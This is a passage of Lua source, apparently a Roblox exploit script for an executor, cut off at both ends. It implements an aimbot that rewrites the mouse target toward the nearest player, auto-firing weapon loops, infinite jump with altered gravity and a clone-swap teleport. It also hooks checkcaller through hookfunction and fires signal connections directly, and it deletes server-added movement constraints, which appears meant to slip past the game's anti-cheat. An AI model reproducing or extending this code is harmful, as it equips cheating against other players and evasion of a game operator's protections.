			for _, child in ipairs(character_:GetChildren()) do
				if child:IsA("Tool") and child ~= arg then
					pcall(function()
						child:Deactivate()
					end)

					child.Parent = backpack
				end
			end

			if arg.Parent ~= character_ then
				humanoid:EquipTool(arg)
			end

			local now = os.clock()

			while arg.Parent ~= character_ and os.clock() - now < 0.5 do
				RunService.Heartbeat:Wait()
			end

			return arg.Parent == character_
		end

		local function fn10(arg, arg2)
			if not arg or not arg.Parent then
				return
			end
			local character_ = localPlayer.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			local backpack = localPlayer:FindFirstChildOfClass("Backpack")
			if not character_ or not humanoid or humanoid.Health <= 0 or arg.Parent ~= character_ and arg.Parent ~= backpack then
				return
			end
			local tool = character_:FindFirstChildWhichIsA("Tool")
			if tool == arg then
				return
			end

			if tool and tool ~= arg2 then
				return
			end

			pcall(function()
				fn3(0.5)
				humanoid:EquipTool(arg)
			end)
		end

		local function fn11(arg, arg2, arg3)
			local magnitude = (arg2 - arg3).Magnitude
			local now = os.clock()

			repeat
				local n8 = os.clock() - now
				local character_ = localPlayer.Character
				character_ = character_ and character_:FindFirstChild("HumanoidRootPart")
				local humanoidRootPart = arg and arg.Parent and arg:FindFirstChild("HumanoidRootPart")
				if n8 >= n5 and character_ and (character_.Position - arg3).Magnitude <= n7 and (not arg or not arg.Parent or humanoidRootPart and (humanoidRootPart.Position - arg2).Magnitude <= n7) then
					return true
				end

				if magnitude <= n7 and n8 >= n6 then
					return true
				end
				RunService.Heartbeat:Wait()
			until os.clock() - now >= n4

			return false
		end

		local function fn12()
			local playerGui = localPlayer:FindFirstChildOfClass("PlayerGui")
			local toolsFrames = playerGui and playerGui:FindFirstChild("ToolsFrames")
			toolsFrames = toolsFrames and toolsFrames:FindFirstChild("QuantumCloner")
			local teleportToClone = toolsFrames and toolsFrames:FindFirstChild("TeleportToClone")
			if not teleportToClone then
				return nil
			end

			local ok, result = pcall(function()
				return getconnections(teleportToClone.MouseButton1Up)
			end)

			if not ok or type(result) ~= "table" then
				return nil
			end

			for _, v12 in ipairs(result) do
				local function_ = v12.Function
				function_ = function_ and debug.getinfo(function_) or nil
				function_ = function_ and function_.source or ""
				if v12.Enabled and type(v12.Fire) == "function" and string.find(function_, "QuantumClonerScript", 1, true) then
					return v12
				end
			end
		end

		v10:CreateButton({
			Name = "Instant Clone Swap",
			ButtonText = "Swap",
			Callback = function()
				if flag2 then
					return false
				end
				flag2 = true
				local character_ = localPlayer.Character
				character_ = character_ and character_:FindFirstChildWhichIsA("Tool")
				local quantumCloner = fn8()

				if not quantumCloner then
					local v12
					quantumCloner, v12 = fn5("Quantum Cloner")

					if not quantumCloner then
						fn6("Quantum Cloner", v12)
						flag2 = false
						return false
					end
				end

				if character_ == quantumCloner then
					character_ = nil
				end

				if not quantumCloner or not quantumCloner:IsA("Tool") or not fn9(quantumCloner) then
					fn10(character_, quantumCloner)
					flag2 = false
					return false
				end

				local v12 = fn12()

				if not v12 then
					fn10(character_, quantumCloner)
					flag2 = false
					return false
				end

				local str = tostring(localPlayer.UserId) .. "_Clone"
				local v13 = Workspace:FindFirstChild(str)
				local v14 = nil
				local now = os.clock()

				local connection = Workspace.ChildAdded:Connect(function(child)
					if child.Name == str and child ~= v13 then
						v14 = child
					end
				end)

				local ok

				while true do
					if not v14 then
						pcall(function()
							quantumCloner:Activate()
						end)

						local v15 = Workspace:FindFirstChild(str)

						if v15 and v15 ~= v13 then
							v14 = v15
						end
					end

					local humanoidRootPart = v14 and v14:FindFirstChild("HumanoidRootPart")

					if humanoidRootPart then
						local humanoidRootPart2 = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
						humanoidRootPart2 = humanoidRootPart2 and humanoidRootPart2.Position
						local position = humanoidRootPart.Position

						ok = pcall(function()
							v12:Fire()
						end)

						if ok and humanoidRootPart2 then
							fn11(v14, humanoidRootPart2, position)
						end

						break
					else
						RunService.Heartbeat:Wait()
						ok = false
						if not (os.clock() - now >= n3) then
							continue
						end
					end

					break
				end

				connection:Disconnect()
				fn10(character_, quantumCloner)
				flag2 = false
				return ok
			end,
		})
	end

	do
		local n3 = 0.05
		local n4 = 0.05
		local n5 = 200

		local tbl3 = {
			["Web Slinger"] = true,
			["Taser Gun"] = true,
			["Laser Cape"] = true,
			["Paintball Gun"] = true,
		}

		local PlayerMouse = require(ReplicatedStorage:WaitForChild("Packages"):WaitForChild("PlayerMouse"))
		local flag2 = false
		local flag3 = false
		local n6 = 0
		local flag4 = false
		local n7 = 0
		local flag5 = false
		local hit = nil
		local target = nil
		local v12 = nil
		local n8 = 0
		local n9 = 0
		local n10 = 0
		local obj2 = setmetatable({}, { __mode = "k" })
		local connection = nil

		local function fn8()
			if flag5 then
				return
			end
			flag5 = true
			hit = PlayerMouse.Hit
			target = PlayerMouse.Target
		end

		local function fn9(arg)
			local character_ = arg.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")

			if character_ then
				character_ = character_:FindFirstChild("HumanoidRootPart") or character_:FindFirstChild("UpperTorso") or character_:FindFirstChild("Torso")
			end

			if humanoid and humanoid.Health > 0 and character_ then
				return humanoid, character_
			end
		end

		local function fn10()
			local character_ = localPlayer.Character
			if not character_ then
				return nil
			end

			for k in pairs(tbl3) do
				local v13 = character_:FindFirstChild(k)
				if v13 and v13:IsA("Tool") then
					return v13
				end
			end
		end

		local function fn11()
			local v13, v14 = fn9(localPlayer)
			if not v14 then
				return nil
			end
			local v15 = nil
			local v16 = nil

			for _, player in ipairs(Players:GetPlayers()) do
				if player ~= localPlayer then
					local v17, v18 = fn9(player)

					if v18 then
						local magnitude = (v18.Position - v14.Position).Magnitude

						if not v15 or magnitude < v15 then
							v15 = magnitude
							v16 = v18
						end
					end
				end
			end

			return v16
		end

		local function fn12(arg)
			local now = os.clock()

			if arg or not v12 or not v12.Parent or now - n8 >= n3 then
				n8 = now
				v12 = fn11()
			end

			return v12
		end

		local function fn13(arg)
			local muzzle = obj2[arg]

			if not muzzle or not muzzle.Parent then
				muzzle = arg:FindFirstChild("Muzzle", true) or arg:FindFirstChild("FirePoint", true) or arg:FindFirstChild("Handle")
				obj2[arg] = muzzle
			end

			if muzzle then
				if muzzle:IsA("Attachment") then
					return muzzle.WorldPosition
				end

				if muzzle:IsA("BasePart") then
					return muzzle.Position
				end
			end

			local character_ = localPlayer.Character
			character_ = character_ and character_:FindFirstChild("HumanoidRootPart")
			return character_ and character_.Position
		end

		local function fn14()
			local now = os.clock()
			if now < n10 then
				return n9
			end
			n10 = now + 0.5

			local ok, result = pcall(function()
				return localPlayer:GetNetworkPing()
			end)

			if ok and type(result) == "number" then
				n9 = math.clamp(result, 0, 0.35)
			end

			return n9
		end

		local function fn15(arg, arg2)
			local n11 = n5 * n5
			local n12 = arg2:Dot(arg2) - n11
			local n13 = 2 * arg:Dot(arg2)
			local v13 = arg:Dot(arg)
			local n14

			if math.abs(n12) < 0.0001 then
				n14 = nil

				if math.abs(n13) > 0.0001 then
					n14 = -v13 / n13
					local v14 = nil

					if not (n14 > 0) then
						n14 = v14
					end
				end
			else
				local n15 = n13 * n13 - 4 * n12 * v13
				n14 = nil

				if n15 >= 0 then
					local v14 = math.sqrt(n15)
					local n16 = (-n13 - v14) / 2 * n12
					local n17 = (-n13 + v14) / 2 * n12

					if n16 > 0 and n17 > 0 then
						n14 = math.min(n16, n17)
					elseif n16 > 0 then
						n14 = n16
					else
						n14 = nil

						if n17 > 0 then
							n14 = n17
						end
					end
				end
			end

			return math.clamp(n14 or arg.Magnitude / n5, 0, 3)
		end

		local function fn16(arg, arg2)
			local v13 = fn13(arg)
			if not v13 then
				return arg2.Position
			end
			local assemblyLinearVelocity = arg2.AssemblyLinearVelocity
			local n11 = arg2.Position + assemblyLinearVelocity * fn14()
			return n11 + assemblyLinearVelocity * fn15(n11 - v13, assemblyLinearVelocity)
		end

		local function fn17(arg)
			local v13 = fn10()
			if not flag2 and not flag3 and not flag4 or not v13 then
				return false
			end
			local v14 = fn12(arg)
			if not v14 then
				return false
			end
			local n11

			if v13.Name == "Paintball Gun" then
				n11 = fn16(v13, v14)
			else
				n11 = v14.Position + v14.AssemblyLinearVelocity * n4
			end

			PlayerMouse.Hit = CFrame.new(n11)
			PlayerMouse.Target = v14
			return true
		end

		local function fn18()
			if not flag5 then
				return
			end
			flag5 = false
			v12 = nil
			n8 = 0
			PlayerMouse.Hit = hit
			PlayerMouse.Target = target
			hit = nil
			target = nil
		end

		local function fn19()
			flag2 = false
			ContextActionService:UnbindAction("ChilliToolAimbotAction")

			pcall(function()
				RunService:UnbindFromRenderStep("ChilliToolAimbotRender")
			end)

			if connection then
				connection:Disconnect()
				connection = nil
			end

			if not flag3 and not flag4 then
				fn18()
			end
		end

		local function fn20()
			fn19()
			flag2 = true

			ContextActionService:BindActionAtPriority("ChilliToolAimbotAction", function(arg, arg2)
				if arg2 == Enum.UserInputState.Begin and fn10() then
					fn17(true)
				end

				return Enum.ContextActionResult.Pass
			end, false, 10000, Enum.UserInputType.MouseButton1, Enum.UserInputType.Touch)

			connection = UserInputService.InputBegan:Connect(function(input)
				local userInputType = input.UserInputType

				if userInputType == Enum.UserInputType.MouseButton1 or userInputType == Enum.UserInputType.Touch then
					fn17(true)
				end
			end)

			RunService:BindToRenderStep("ChilliToolAimbotRender", Enum.RenderPriority.Last.Value + 20, function()
				if fn10() then
					fn8()
					fn17(false)
				elseif not flag3 and not flag4 then
					fn18()
				end
			end)
		end

		local function fn21()
			local character_ = localPlayer.Character
			character_ = character_ and character_:FindFirstChild("Paintball Gun")
			return character_ and character_:IsA("Tool") and character_ or nil
		end

		local function fn22()
			flag3 = false
			n6 += 1
			local v13 = fn21()

			if v13 then
				pcall(function()
					v13:Deactivate()
				end)
			end

			if not flag2 and not flag4 then
				fn18()
			end
		end

		local function fn23()
			fn22()
			local paintballGun, v13 = fn5("Paintball Gun")

			if not paintballGun then
				fn6("Paintball Gun", v13)
			end

			flag3 = true
			n6 += 1
			local v14 = n6

			task.spawn(function()
				while flag3 and v14 == n6 and flag do
					local v15 = fn21()

					if v15 then
						fn8()

						if fn17(false) then
							pcall(function()
								v15:Activate()
							end)
						end
					elseif not flag2 and not flag4 then
						fn18()
					end

					task.wait(0.04)
				end
			end)

			return true
		end

		local function fn24()
			local character_ = localPlayer.Character
			character_ = character_ and character_:FindFirstChild("Laser Cape")
			return character_ and character_:IsA("Tool") and character_ or nil
		end

		local function fn25()
			flag4 = false
			n7 += 1
			local v13 = fn24()

			if v13 then
				pcall(function()
					v13:Deactivate()
				end)
			end

			if not flag2 and not flag3 then
				fn18()
			end
		end

		local function fn26()
			fn25()
			local laserCape, v13 = fn5("Laser Cape")

			if not laserCape then
				fn6("Laser Cape", v13)
			end

			flag4 = true
			n7 += 1
			local v14 = n7

			task.spawn(function()
				while flag4 and v14 == n7 and flag do
					local v15 = fn24()

					if v15 then
						fn8()

						if fn17(false) then
							pcall(function()
								v15:Activate()
							end)
						end
					elseif not flag2 and not flag3 then
						fn18()
					end

					task.wait(0.04)
				end
			end)

			return true
		end

		fn2(function()
			fn25()
			fn22()
			fn19()
		end)

		v11:CreateToggle({
			Name = "Aimbot",
			Default = true,
			Callback = function(arg)
				if arg then
					fn20()
				else
					fn19()
				end
			end,
		})

		v11:CreateToggle({
			Name = "Auto Paintball",
			Note = "Automatically uses the Paintball Gun while equipped.",
			Default = true,
			Callback = function(arg)
				if arg then
					fn23()
				else
					fn22()
				end
			end,
		})

		v11:CreateToggle({
			Name = "Auto Laser Cape",
			Note = "Automatically uses the Laser Cape while equipped.",
			Default = false,
			Callback = function(arg)
				if arg then
					fn26()
				else
					fn25()
				end
			end,
		})
	end

	local v12
	v12 = v9:CreateSection({ Name = "Speed Boost" })
	local v13
	v13 = v9:CreateSection({ Name = "Jump Boost" })
	v6 = v9:CreateSection({ Name = "Character" })
	v7 = v9:CreateSection({ Name = "Invisibility" })
	v8 = v9:CreateSection({ Name = "Respawn", Expanded = false })

	do
		local n3 = 0.0083333333333333332
		local n4 = 4
		local n5 = 0.12
		local n6 = 25
		local n7 = 0.045
		local n8 = 0.03
		local n9 = 0.015
		local n10 = 10
		local n11 = 60
		local flag2 = false
		local connection = nil
		local connection2 = nil
		local connection3 = nil
		local connection4 = nil
		local connection5 = nil
		local flag3 = false
		local humanoid = nil
		local humanoidRootPart = nil
		local flag4 = false
		local flag5 = false
		local n12 = 0
		local n13 = 0
		local n14 = 0
		local n15 = 0
		local n16 = 0
		local n17 = 60
		local n18 = 19.1
		local flag6 = false
		local y = nil

		local function fn8()
			return math.max(n17 / n11, 0.01)
		end

		local function fn9()
			if not flag2 or not humanoidRootPart or not humanoidRootPart.Parent then
				return
			end

			if UserInputService:GetFocusedTextBox() then
				return
			end
			y = y or humanoidRootPart.Position.Y
			if flag6 and humanoidRootPart.Position.Y - y >= n18 then
				return
			end
			local v14 = fn8()
			n13 = n11 * v14
			local n19 = n5 / v14
			n12 = os.clock() + n19
			flag5 = true
			n15 = os.clock()
		end

		local function fn10()
			if not humanoid or not humanoidRootPart or not humanoidRootPart.Parent then
				return
			end

			if humanoid.Health <= 0 then
				flag4 = false
				flag5 = false
				return
			end

			local assemblyLinearVelocity = humanoidRootPart.AssemblyLinearVelocity
			local flag7 = humanoid.FloorMaterial ~= Enum.Material.Air
			local now = os.clock()
			local v14 = fn8()

			if flag7 then
				y = humanoidRootPart.Position.Y
			end

			local flag8 = flag6 and (flag4 or flag5) and y and humanoidRootPart.Position.Y - y >= n18

			if flag4 and not flag8 then
				if now - n15 >= n7 / v14 or flag5 and n12 - now <= n8 / v14 then
					fn9()
				end
			end

			if flag8 then
				flag5 = false

				if assemblyLinearVelocity.Y > 0 then
					humanoidRootPart.AssemblyLinearVelocity = Vector3.new(assemblyLinearVelocity.X, 0, assemblyLinearVelocity.Z)
				end
			elseif flag5 then
				if n12 <= now then
					flag5 = false
				else
					local n19 = (Workspace.Gravity * v14 * v14 - Workspace.Gravity) * n3
					humanoidRootPart.AssemblyLinearVelocity = Vector3.new(assemblyLinearVelocity.X, assemblyLinearVelocity.Y + (n13 - assemblyLinearVelocity.Y) * (1 - math.exp(-n6 * v14 * n3)) - n19, assemblyLinearVelocity.Z)
				end
			elseif not flag7 then
				local gravity = Workspace.Gravity

				if assemblyLinearVelocity.Y < 0 then
					gravity += n10
				end

				local n19 = gravity * v14 * v14 - Workspace.Gravity

				if math.abs(n19) > 0.001 then
					humanoidRootPart.AssemblyLinearVelocity = Vector3.new(assemblyLinearVelocity.X, assemblyLinearVelocity.Y - n19 * n3, assemblyLinearVelocity.Z)
				end
			end
		end

		local function fn11(deltaTime)
			if not flag2 or not flag then
				return
			end
			n16 += deltaTime
			if n16 < n3 then
				return
			end
			local n19 = math.floor(n16 / n3)

			if n4 < n19 then
				n16 = 0
				n19 = 4
			else
				n16 -= n19 * n3
			end

			for i_ = 1, n19 do
				fn10()
			end
		end

		local function fn12(arg, arg2)
			if not flag2 then
				return Enum.ContextActionResult.Pass
			end

			if arg2 == Enum.UserInputState.Begin then
				local now = os.clock()

				if n9 <= now - n14 then
					n14 = now
					flag4 = true
					y = humanoidRootPart and humanoidRootPart.Position.Y or nil
					fn9()
				end
			elseif arg2 == Enum.UserInputState.End or arg2 == Enum.UserInputState.Cancel then
				flag4 = false
			end

			return Enum.ContextActionResult.Pass
		end

		local function fn13()
			if flag3 then
				ContextActionService:UnbindAction("ChilliInfinityJump2")
				flag3 = false
			end
		end

		local function fn14()
			fn13()
			ContextActionService:BindAction("ChilliInfinityJump2", fn12, false, Enum.KeyCode.Space, Enum.KeyCode.ButtonA)
			flag3 = true
		end

		local function fn15(arg)
			if connection3 then
				connection3:Disconnect()
			end

			if connection4 then
				connection4:Disconnect()
			end

			connection3 = arg.InputBegan:Connect(function(input)
				if not flag2 or input.UserInputType ~= Enum.UserInputType.Touch then
					return
				end
				local now = os.clock()

				if now - n14 >= n9 then
					n14 = now
					y = humanoidRootPart and humanoidRootPart.Position.Y or nil
					fn9()
				end

				flag4 = true
			end)

			connection4 = arg.InputEnded:Connect(function(input)
				if input.UserInputType ~= Enum.UserInputType.Touch then
					return
				end
				flag4 = false
			end)
		end

		local function fn16()
			if connection3 then
				connection3:Disconnect()
				connection3 = nil
			end

			if connection4 then
				connection4:Disconnect()
				connection4 = nil
			end

			if connection5 then
				connection5:Disconnect()
				connection5 = nil
			end
		end

		local function fn17(arg)
			return (arg:IsA("ImageButton") or arg:IsA("TextButton")) and arg.Name:lower():find("jump", 1, true) ~= nil
		end

		local function fn18()
			fn16()
			if not UserInputService.TouchEnabled then
				return
			end
			local playerGui = localPlayer:FindFirstChildOfClass("PlayerGui")
			if not playerGui then
				return
			end
			local touchGui = playerGui:FindFirstChild("TouchGui", true)

			if touchGui then
				for _, descendant in ipairs(touchGui:GetDescendants()) do
					if fn17(descendant) then
						fn15(descendant)
						break
					end
				end
			end

			connection5 = playerGui.DescendantAdded:Connect(function(descendant)
				if flag2 and fn17(descendant) then
					fn15(descendant)
				end
			end)
		end

		local function fn19(arg)
			humanoid = arg:FindFirstChildOfClass("Humanoid") or arg:WaitForChild("Humanoid", 5)
			humanoidRootPart = arg:FindFirstChild("HumanoidRootPart") or arg:WaitForChild("HumanoidRootPart", 5)
			flag4 = false
			flag5 = false
			y = humanoidRootPart and humanoidRootPart.Position.Y or nil
			n16 = 0
		end

		local function fn20()
			flag2 = false
			flag4 = false
			flag5 = false

			if connection then
				connection:Disconnect()
				connection = nil
			end

			if connection2 then
				connection2:Disconnect()
				connection2 = nil
			end

			fn13()
			fn16()
			humanoid = nil
			humanoidRootPart = nil
		end

		local function fn21()
			fn20()
			flag2 = true

			if localPlayer.Character then
				fn19(localPlayer.Character)
			end

			connection2 = localPlayer.CharacterAdded:Connect(function(character_)
				if flag2 then
					fn19(character_)
				end
			end)

			fn14()
			fn18()
			connection = RunService.Heartbeat:Connect(fn11)
		end

		fn2(fn20)

		v13:CreateSlider({
			Name = "Jump Speed",
			ShowWhen = v13:CreateToggle({
				Name = "Infinity Jump",
				Default = true,
				Callback = function(arg)
					if arg then
						fn21()
					else
						fn20()
					end
				end,
			}),
			Min = 20,
			Max = 100,
			Default = 60,
			AllowDecimals = true,
			Increment = 0.1,
			Note = "Changes jump timing while preserving the height of the original 60 speed.",
			Callback = function(arg)
				n17 = math.clamp(tonumber(arg) or 60, 20, 100)
			end,
		})

		v13:CreateSlider({
			Name = "Jump Height",
			ShowWhen = v13:CreateToggle({
				Name = "Limit Jump Height",
				Default = false,
				Note = "Limits the height of each jump. Leave this off to keep air jumping upward.",
				Callback = function(arg)
					flag6 = arg == true
					y = humanoidRootPart and humanoidRootPart.Position.Y or nil
				end,
			}),
			Min = 1,
			Max = 21,
			Default = 19.1,
			AllowDecimals = true,
			Increment = 0.1,
			Callback = function(arg)
				n18 = math.clamp(tonumber(arg) or 19.1, 1, 21)
			end,
		})
	end

	floatSpeedToolBridge = {}
	local n3
	n3 = 0.3
	local n4
	n4 = 200
	local n5
	n5 = 0.05
	local n6
	n6 = 0.02
	local n7
	n7 = 0.5
	local n8
	n8 = 0.5
	local n9
	n9 = 2
	local n10
	n10 = 14
	local n11
	n11 = 2
	local n12
	n12 = 19.1
	local n13
	n13 = 0.2
	local n14
	n14 = 0
	local n15
	n15 = 0.52
	local n16
	n16 = 52
	local n17
	n17 = 28
	local n18
	n18 = 240
	local n19
	n19 = 185
	local flag2
	flag2 = false
	local flag3
	flag3 = true
	local flag4
	flag4 = true
	local flag5
	flag5 = false
	local n20
	n20 = n17 - n8
	local n21
	n21 = 1
	local str
	str = "Bottom"
	local now
	now = os.clock()
	local v14
	v14 = nil
	local v15
	v15 = nil
	local y
	y = nil
	local now2
	now2 = os.clock()
	local n22
	n22 = 0
	local str2
	str2 = "Grapple Hook"
	local v16, n23, v17, v18, flag6, flag7, v19, v20, flag8, flag9
	local connection, connection2, connection3, connection4, connection5, flag10, flag11, n24, fn8

	do
		local n25 = 0.8
		v16 = nil
		n23 = 0
		local flag12 = false
		v17 = nil
		v18 = nil
		flag6 = false
		flag7 = localPlayer:GetAttribute("Stealing") == true
		v19 = nil
		v20 = nil
		flag8 = false
		flag9 = false
		local connection6 = nil
		local v21 = nil
		connection = nil
		connection2 = nil
		connection3 = nil
		connection4 = nil
		connection5 = nil
		local connection7 = nil
		local flag13 = false
		flag10 = false
		flag11 = false
		n24 = 0
		local flag14 = false
		local v22 = nil
		local tbl3 = {}
		local tbl4 = {}
		local v23 = nil
		local connection8 = nil
		local raycastParams = RaycastParams.new()
		local v24 = nil
		raycastParams.FilterType = Enum.RaycastFilterType.Exclude
		raycastParams.IgnoreWater = true

		pcall(function()
			raycastParams.RespectCanCollide = true
		end)

		local function fn9()
			local character_ = localPlayer.Character
			if not character_ then
				return nil, nil
			end
			local findFirstChildOfClass = character_.FindFirstChildOfClass
			return character_:FindFirstChild("HumanoidRootPart"), findFirstChildOfClass(character_, "Humanoid")
		end

		fn8 = function(arg)
			return arg and arg:IsA("Tool")
		end

		local function fn10()
			local tbl5 = {}
			local items = ReplicatedStorage:FindFirstChild("Items")

			if items then
				for _, child in ipairs(items:GetChildren()) do
					if child:IsA("Tool") and child:GetAttribute("IgnoreAntiCheat") == true then
						tbl5[child.Name] = true
					end
				end
			end

			local tbl6 = {}

			for k in pairs(tbl5) do
				if k ~= str2 and fn8(fn4(k)) then
					tbl6[#tbl6 + 1] = k
				end
			end

			table.sort(tbl6, function(arg, arg2)
				return string.lower(arg) < string.lower(arg2)
			end)

			tbl6[#tbl6 + 1] = str2
			return tbl6, tbl6[1] or "Grapple Hook"
		end

		local v25, v26 = fn10()
		local flag15 = v26 == str2 and n18 or n19

		local function fn11()
			local flag16 = v26 == str2
			local n26 = flag16 and 270 or 210
			flag15 = math.clamp(flag16 and n18 or n19, 50, n26)

			if v20 then
				v20:SetRange(50, n26, false)
				v20:Set(flag15, false)
			end
		end

		local function fn12()
			v23 = nil

			if connection8 then
				connection8:Disconnect()
				connection8 = nil
			end

			for k, v27 in pairs(tbl3) do
				pcall(function()
					k.Attachment0 = v27.Attachment0
					k.Attachment1 = v27.Attachment1
					k.Enabled = v27.Enabled
				end)
			end

			table.clear(tbl3)

			for k, v27 in pairs(tbl4) do
				pcall(function()
					k.Volume = v27
				end)
			end

			table.clear(tbl4)
		end

		local function fn13(arg)
			if v23 == arg then
				return
			end
			fn12()
			v23 = arg
			local handle = arg:FindFirstChild("Handle")
			local beam = handle and handle:FindFirstChild("Beam")

			if beam and beam:IsA("Beam") then
				tbl3[beam] = { Enabled = beam.Enabled, Attachment0 = beam.Attachment0, Attachment1 = beam.Attachment1 }
				beam.Enabled = false
				beam.Attachment0 = nil

				connection8 = beam:GetPropertyChangedSignal("Enabled"):Connect(function()
					if v23 == arg and beam.Enabled then
						beam.Enabled = false
					end
				end)
			end

			for _, descendant in ipairs(arg:GetDescendants()) do
				if descendant:IsA("Sound") then
					tbl4[descendant] = descendant.Volume
					descendant.Volume = 0
				end
			end
		end

		local function fn14()
			if type(hookfunction) ~= "function" or type(checkcaller) ~= "function" or type(newcclosure) ~= "function" then
				return false
			end

			if v22 then
				flag14 = true
				local flag16 = false

				pcall(function()
					flag16 = checkcaller() == false
				end)

				flag14 = false
				if flag16 then
					return true
				end
				v22 = nil
			end

			return pcall(function()
				v22 = hookfunction(checkcaller, newcclosure(function()
					if flag14 then
						return false
					end
					return v22()
				end))
			end) and v22 ~= nil
		end

		local function fn15(arg)
			if not arg or arg.Parent ~= localPlayer.Character then
				return
			end
			flag14 = true

			pcall(function()
				arg:Deactivate()
				arg:Activate()
			end)

			if type(firesignal) == "function" then
				pcall(function()
					firesignal(arg.Activated)
				end)
			end

			if type(getconnections) == "function" then
				pcall(function()
					local v27 = getconnections(arg.Activated)

					if type(v27) == "table" then
						for _, v28 in ipairs(v27) do
							if v28.Enabled then
								if type(v28.Fire) == "function" then
									v28:Fire()
								elseif type(v28.Function) == "function" then
									v28.Function()
								end
							end
						end
					end
				end)
			end

			flag14 = false
		end

		local function fn16(arg)
			if not (flag10 or flag11) or not arg or arg.Parent ~= localPlayer.Character or arg:GetAttribute("CooldownTime") ~= nil then
				return
			end
			n24 = os.clock() + n25
			fn15(arg)
		end

		local function fn17()
			v21 = nil

			if connection6 then
				connection6:Disconnect()
				connection6 = nil
			end
		end

		local function fn18(arg)
			if v21 == arg then
				return
			end
			fn17()
			v21 = arg

			connection6 = arg:GetAttributeChangedSignal("CooldownTime"):Connect(function()
				if (flag10 or flag11) and arg:GetAttribute("CooldownTime") == nil then
					fn16(arg)
				end
			end)
		end

		local function fn19()
			if not flag9 then
				return
			end
			flag9 = false
			local v27, v28 = fn9()
			if not v27 or not v28 or v28.Health <= 0 then
				return
			end
			local assemblyLinearVelocity = v27.AssemblyLinearVelocity
			local moveDirection = v28.MoveDirection
			local vector = Vector3.zero

			if moveDirection.Magnitude > 0.001 then
				vector = moveDirection.Unit * v28.WalkSpeed
			end

			v27.AssemblyLinearVelocity = Vector3.new(vector.X, assemblyLinearVelocity.Y, vector.Z)
		end

		local function fn20()
			fn19()
			flag5 = false
			flag8 = false
			flag10 = false
			v16 = nil

			if not flag11 then
				n24 = 0
				fn17()
				fn12()
			end
		end

		local function fn21()
			fn20()

			if v17 then
				v17:Set(false, true)
			end
		end

		local function fn22()
			if flag12 then
				return
			end
			flag12 = true

			task.defer(function()
				flag12 = false
				fn21()
			end)
		end

		local function fn23(arg, arg2)
			if arg == str2 and arg2 == "rebirth" then
				v.Notify("Tool unavailable", "Grapple Hook requires 3 Rebirths.", 5)
				return
			end
			fn6(arg, arg2)
		end

		local function fn24(arg)
			local character_ = localPlayer.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			if not character_ or not humanoid or humanoid.Health <= 0 or not fn8(arg) then
				return nil
			end
			n23 = os.clock() + 1.5
			if arg.Parent == character_ then
				return arg
			end

			if not (character_:FindFirstChild("RightHand") or character_:FindFirstChild("Right Arm")) then
				if not character_:WaitForChild("RightHand", 1.5) then
					character_:WaitForChild("Right Arm", 1.5)
				end
			end

			pcall(function()
				humanoid:EquipTool(arg)
			end)

			local now3 = os.clock()

			while os.clock() - now3 < 0.6 do
				if arg.Parent ~= character_ then
					RunService.Heartbeat:Wait()
					continue
				end
				break
			end

			if arg.Parent ~= character_ and humanoid.Health > 0 then
				pcall(function()
					humanoid:EquipTool(arg)
				end)

				local now4 = os.clock()

				while os.clock() - now4 < 0.6 do
					if arg.Parent ~= character_ then
						RunService.Heartbeat:Wait()
						continue
					end
					break
				end
			end

			if arg.Parent ~= character_ then
				pcall(function()
					arg.Parent = character_
				end)
			end

			if arg.Parent == character_ then
				RunService.Heartbeat:Wait()
				return arg
			end
			local v27 = character_:FindFirstChild(v26)
			return fn8(v27) and v27 or nil
		end

		local function fn25()
			local grappleHook = fn4(v26)

			if not fn8(grappleHook) and v26 == str2 then
				local v27
				grappleHook, v27 = fn5("Grapple Hook")
				if not fn8(grappleHook) then
					fn23("Grapple Hook", v27)
					return false
				end
			elseif not fn8(grappleHook) then
				v.Notify("Tool unavailable", v26 .. " is not currently owned.", 5)
				return false
			end

			v16 = fn24(grappleHook)
			if not v16 then
				v.Notify("Tool unavailable", "Unable to equip " .. v26 .. " right now.", 5)
				return false
			end
			flag5 = true
			flag8 = true

			if v26 == str2 then
				fn14()
				flag10 = true
				fn13(v16)
				fn18(v16)
				fn16(v16)
			end

			return true
		end

		local function fn26()
			local v27, v28 = fn10()
			local v29, v30, v31 = ipairs(v27)
			local flag16 = false

			for _, v32 in v29, v30, v31 do
				if v32 == v26 then
					flag16 = true
					break
				end
			end

			if not flag16 then
				v26 = v28

				if flag5 then
					fn22()
				end
			end

			fn11()

			if v19 then
				v19:SetOptions(v27, v26, false)
			end
		end

		local function fn27()
			if flag13 then
				return
			end
			flag13 = true

			task.defer(function()
				flag13 = false
				fn26()
			end)
		end

		local function fn28(arg)
			if connection then
				connection:Disconnect()
			end

			if connection2 then
				connection2:Disconnect()
			end

			if connection3 then
				connection3:Disconnect()
			end

			connection = arg.DescendantAdded:Connect(function(descendant)
				if not (flag10 or flag11) or os.clock() > n24 then
					return
				end

				if not (descendant:IsA("BodyMover") or descendant:IsA("Constraint")) then
					return
				end

				task.defer(function()
					if descendant.Parent then
						pcall(function()
							descendant:Destroy()
						end)
					end
				end)
			end)

			connection2 = arg.ChildAdded:Connect(function(child)
				fn27()
				local humanoid = arg:FindFirstChildOfClass("Humanoid")
				humanoid = humanoid and humanoid.Health > 0
				local v27 = flag5

				if not flag5 then
					humanoid = v27
				end

				if humanoid and child:IsA("Tool") and child.Name ~= v26 and not fn7() and os.clock() >= n23 then
					fn22()
				end
			end)

			connection3 = arg.ChildRemoved:Connect(function(child)
				fn27()
				local humanoid = arg:FindFirstChildOfClass("Humanoid")
				humanoid = humanoid and humanoid.Health > 0
				local v27 = flag5

				if not flag5 then
					humanoid = v27
				end

				if humanoid and child == v16 and not fn7() and os.clock() >= n23 then
					task.defer(function()
						local character_ = localPlayer.Character
						local humanoid2 = character_ and character_:FindFirstChildOfClass("Humanoid")
						if not humanoid2 or humanoid2.Health <= 0 then
							return
						end
						character_ = character_ and character_:FindFirstChild(v26)

						if flag5 and not fn8(character_) then
							fn22()
						end
					end)
				end
			end)
		end

		local function fn29(arg)
			if connection4 then
				connection4:Disconnect()
				connection4 = nil
			end

			if connection5 then
				connection5:Disconnect()
				connection5 = nil
			end

			if connection7 then
				connection7:Disconnect()
				connection7 = nil
			end

			if arg then
				connection4 = arg.ChildAdded:Connect(fn27)
				connection5 = arg.ChildRemoved:Connect(fn27)
			end
		end

		if localPlayer.Character then
			fn28(localPlayer.Character)
		end

